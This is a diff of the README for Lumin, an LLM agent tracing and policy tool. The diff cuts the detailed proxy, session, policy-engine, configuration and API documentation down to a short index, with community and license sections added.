 
-# Just change the base_url. That's it.
 client = OpenAI(
-    base_url="http://localhost:8000/v1/openai/v1",
-    api_key="sk-…",  # forwarded to OpenAI verbatim
+    base_url="http://localhost:8000/v1/openai",  # ← Lumin proxy
+    api_key="your-real-openai-key",
 )
-
-resp = client.chat.completions.create(
-    model="gpt-4o-mini",
-    messages=[{"role": "user", "content": "Hello"}],
-)
+client.chat.completions.create(...)  # auto-traced
 ```
 
-```bash
-# Override the upstream per-process via env, default is api.openai.com:
-export LUMIN_PROXY_OPENAI_BASE="http://localhost:11434"   # local Ollama
-# or per-request via header:
-curl http://localhost:8000/v1/openai/v1/chat/completions \
-  -H "X-Lumin-Upstream: https://api.anthropic.com" \
-  -H "X-Lumin-Project: openclaw" \
-  -d '{"model":"gpt-4o-mini","messages":[{"role":"user","content":"hi"}]}'
-```
-
-**What you get**: every call recorded with model, provider, prompt, response, tokens, cost, status. Streaming responses pass through chunk-by-chunk; the assembled message + usage land in the span when the stream closes. If the caller sends a W3C `traceparent` header, the proxy reuses the inbound trace_id so the span fuses with whatever upstream observability tool drove the call. Upstream timeouts / 5xx persist as `status=error` spans so failed calls show up in the dashboard.
-
-### Sessions (multi-turn conversations)
-
-Group several agent calls into one logical conversation:
-
-```python
-import lumin
-
-with lumin.session(name="booking-conversation"):
-    my_agent("Book me a flight to Tokyo")
-    my_agent("Make it business class")
-    my_agent("Add a hotel for 3 nights")
-```
-
-Every traced call inside the `with` block is tagged with a shared `session_id`. The dashboard groups them under `/sessions` with aggregate cost / duration / quality. Click into a session to see the turns in order, click any turn to expand its full span tree.
-
-TypeScript:
-
-```typescript
-import { withSession, trace } from '@lumin-io/sdk';
-
-const myAgent = trace(async (q: string) => '...', { name: 'agent' });
-
-await withSession({ name: 'booking-conversation' }, async () => {
-  await myAgent('Book me a flight');
-  await myAgent('Make it business class');
-});
-```
-
-Or pin a specific session at decoration time:
-
-```python
-@lumin.trace(session_id="user-123-conv-456")
-def my_agent(q): ...
-```
-
-Resolution priority for a span's `session_id` (most specific wins): explicit `@trace(session_id=…)` > active `lumin.session()` context > parent span's `session_id` > `None`. Traces without a `session_id` stay in `/traces` as standalone runs and don't appear under any session.
-
-### Policy engine
-
-Define rules that fire when an agent misbehaves. Manage them in the dashboard at `/policies` (UI editor with audit log) or via a YAML file at startup (`LUMIN_POLICY_FILE=policies.yaml`). The first time the engine starts with a YAML file and an empty DB, the rules are imported once; from then on the DB is the source of truth.
-
-```yaml
-version: 1
-policies:
-  - name: cost_runaway
-    description: Trace cost exceeded $0.50 — likely runaway loop or context bloat
-    trigger: trace_end
-    condition: "trace.total_cost_usd > 0.50"
-    action: alert
-    severity: high
-
-  - name: pii_leak_email_in_response
-    trigger: span_end
-    condition: "span.type == 'llm' and '@' in str(span.output) and '.com' in str(span.output)"
-    action: flag
-    severity: medium
-
-  - name: slow_billing_only
-    description: Only fires for the billing agent
-    trigger: span_end
-    condition: "span.type == 'llm' and span.duration_ms > 15000"
-    action: alert
-    severity: medium
-    scope:
-      agents:
-        - billing_agent
-```
-
-Conditions are evaluated by [simpleeval](https://github.com/danthedeckie/simpleeval) — safe expressions only, no `eval()`. Available identifiers: `span` and `trace` (with `.duration_ms`, `.total_cost_usd`, `.span_count`, `.error_count`, `.tokens_input/output`, `.model`, `.input`, `.output`, `.type`, etc.). Available functions: `len`, `str`, `int`, `float`, `abs`. Anything else (`__import__`, `open`, method calls) is rejected at write time.
-
-`action: alert` POSTs the violation payload to the policy's `webhook_url` (or the global `lumin.configure(alert_webhook=…)` fallback). `action: flag` is silent — visible in `/violations` but no webhook fired. Violations are visible in three places:
-
-- A red badge on the agent's card on `/agents`
-- The `/violations` page (filterable by severity, policy name)
-- The `Policy` tab on each trace detail page
-
-`scope.agents: [name1, name2]` (Phase 3) limits a rule to specific agents. Empty / omitted means it applies to every agent. The agent identity is `trace.name` — see the [agent grid](#what-you-get) section.
+Streaming and non-streaming both work. Pass W3C `traceparent` header for span stitching.
 
 ---
 
-## Configuration
+## 📖 Where things live
 
-| Env var | Default | Effect |
-|---|---|---|
-| `LUMIN_HOST` | `http://localhost:8000` | API endpoint the SDK posts to |
-| `LUMIN_API_KEY` | _(none)_ | Sent as `X-API-Key` header |
-| `LUMIN_PROJECT` | `default` | Project identifier. Sent as the `X-Lumin-Project` header at ingest. The API normalizes to one of `{openclaw, mastra, voltagent, default}` — anything else folds to `default`. |
-| `LUMIN_TRACING` | _(unset)_ | Set to `true` to auto-attach the LangChain handler |
-| `LUMIN_DATA_DIR` | `./data` (or `/data` in Docker) | Where DuckDB + SQLite files live |
-| `LUMIN_RETENTION_DAYS` | `90` | Max age of traces before automatic cleanup |
-| `LUMIN_CLEANUP_INTERVAL_HOURS` | `24` | How often the cleanup task sweeps |
-| `LUMIN_CLEANUP_ENABLED` | `true` | Set to `false` to disable retention cleanup |
-| `LUMIN_POLICY_FILE` | _(none)_ | Path to a YAML file used to bootstrap the policy DB on first start. Once policies exist in the DB they take over; the file becomes informational. |
-| `LUMIN_POLICY_WATCH` | `true` | Background watcher that reloads the engine when the DB token (row count + max version) changes, or when `LUMIN_POLICY_FILE`'s mtime changes. |
-| `LUMIN_POLICY_WATCH_INTERVAL` | `30` (seconds) | Watcher poll cadence. Lower = faster reload, higher = less DB chatter. |
+- **[Quickstart](#-quickstart)** — start Lumin, trace your first call, open the dashboard
+- **[Add the firewall](#%EF%B8%8F-add-the-firewall-multi-user-bots)** — turn on tenant isolation in three steps
+- **[Architecture](#%EF%B8%8F-architecture)** — single Docker container, FastAPI + Next.js + DuckDB
+- **[Packages](#-packages)** — every component with test counts
+- **[Usage examples](#-usage-examples)** — Python ctxmgr, CrewAI, Anthropic, Mastra, OpenAI proxy
+- **In-source docstrings** — every plugin config field, profile, and toggle is documented in the source it lives in (the openclaw plugin's manifest, the dashboard component help text, and the plugin's TypeScript JSDoc).
 
 ---
 
-## Development
+## 🤝 Community
 
-The fastest path is `./setup.sh` from the repo root — it handles the dependency-order dance across Python + 5 Node packages. Per-package commands if you prefer:
-
-```bash
-# Python SDK
-cd packages/sdk-python
-python -m venv .venv && .venv/bin/pip install -e ".[test,langchain]"
-.venv/bin/pytest
-
-# FastAPI — the local SDK MUST be installed first or the API can't import lumin.
-cd packages/api
-python -m venv .venv
-.venv/bin/pip install -e ../sdk-python
-.venv/bin/pip install -r requirements.txt pytest httpx
-.venv/bin/pytest
-
-# TypeScript SDK
-cd packages/sdk-typescript
-npm ci && npm run build && npm test
-
-# TS integrations (each has its own test suite)
-cd packages/integrations/openclaw  && npm ci && npm test
-cd packages/integrations/mastra    && npm ci && npm test
-cd packages/integrations/voltagent && npm ci && npm test
-
-# Dashboard
-cd packages/dashboard
-npm ci && npm run dev   # http://localhost:3000
-
-# Dashboard E2E (browser tests, requires the Docker container running)
-cd packages/dashboard
-npm run test:e2e:install     # one-time: download Chromium
-npm run test:e2e             # 21 Playwright tests against localhost
-```
-
-CI runs 9 jobs on every push and pull request — Python SDK, FastAPI, TypeScript SDK, three integration suites (OpenClaw / Mastra / VoltAgent), Next.js dashboard build, Docker image build + smoke, and Playwright E2E (real Chromium against the live container). See [`.github/workflows/ci.yml`](.github/workflows/ci.yml).
+- **[GitHub Discussions](https://github.com/amitbidlan/zistica-lumin/discussions)** — questions, ideas, integrations
+- **[GitHub Issues](https://github.com/amitbidlan/zistica-lumin/issues)** — bug reports, feature requests
+- **[Pull Requests](https://github.com/amitbidlan/zistica-lumin/pulls)** — contributions welcome; see `CONTRIBUTING.md`
 
 ---
 
-## API reference (selected)
+## 📄 License
 
-```
-# Ingest + traces
-POST   /v1/spans              # SDKs send here
-POST   /v1/traces             # Manual upsert
-GET    /v1/traces             # Paginated list (?limit=&offset=)
-GET    /v1/traces/{id}        # Single trace
-GET    /v1/traces/{id}/spans  # All spans for a trace
+[Apache 2.0](LICENSE) © [Zistica Inc.](https://github.com/amitbidlan)
 
-# Agents (derived from trace.name)
-GET    /v1/agents             # Grid; ?window_hours=, ?search=, ?project=, ?provider=
-GET    /v1/agents/{name}      # Detail: recent traces + violation breakdown
-
-# Sessions
-GET    /v1/sessions           # Derived via GROUP BY session_id
-GET    /v1/sessions/{id}      # Session detail with all traces in order
-
-# Policies (DB-backed CRUD; falls back to YAML when DB is empty)
-GET    /v1/policies           # ?agent= filters to rules that fire for that agent
-GET    /v1/policies/{name}
-POST   /v1/policies           # Validates condition through SimpleEval at write
-PUT    /v1/policies/{name}    # Bumps version, writes audit row
-DELETE /v1/policies/{name}    # Soft-delete (enabled=false)
-GET    /v1/policies/{name}/audit
-GET    /v1/policy/metrics     # Engine state + p50/p99 eval latency
-POST   /v1/policy/reload      # Force a hot-reload
-
-# Violations
-GET    /v1/violations         # ?severity=, ?policy_name=, ?trace_id=
-GET    /v1/violations/stats   # Counts by severity + policy
-
-# Evals
-POST   /v1/evals              # Submit a quality score
-
-# Misc
-WS     /ws/traces             # Real-time fanout — new_trace + new_span events
-GET    /health                # Liveness check
-GET    /docs                  # Auto-generated Swagger UI (also at /api/docs through dashboard)
-```
-
-**WebSocket message shape:**
-
-```json
-{ "type": "new_span",  "trace_id": "...", "span":  { ...full span... } }
-{ "type": "new_trace",                    "trace": { ...full trace... } }
-```
-
-`new_trace` fires when a trace is first created **or** when a root span (`parent_span_id == null`) lands on an existing stub — so the dashboard always sees the populated trace, not just the stub.
+You can use Lumin free for any purpose — commercial, internal, hosted as a service for your customers — as long as you preserve the license notice. Patent grant included.
 
 ---
 
-## License
+<p align="center">
+   <strong>Lumin replaces Langfuse for one specific job: keeping multi-tenant AI bots safe.</strong><br/>
+   For everything else, they co-exist. Different layers.
+</p>
 
-[Apache License 2.0](LICENSE) — free to use, fork, modify, and distribute.
-
----
-
-## Community
-
-- **Code of Conduct** — see [CODE_OF_CONDUCT.md](CODE_OF_CONDUCT.md). Reports to `support@zistica.com`.
-- **Security** — see [SECURITY.md](SECURITY.md). Please report vulnerabilities privately.
-- **Contributing** — see [CONTRIBUTING.md](CONTRIBUTING.md). Good first issues are labeled in the [tracker](https://github.com/amitbidlan/zistica-lumin/issues).
+<p align="center">
+   <sub>Built by <a href="https://github.com/amitbidlan">Amit Bidlan</a> &amp; the Zistica team — local-first by default, structural by design.</sub>
+</p>
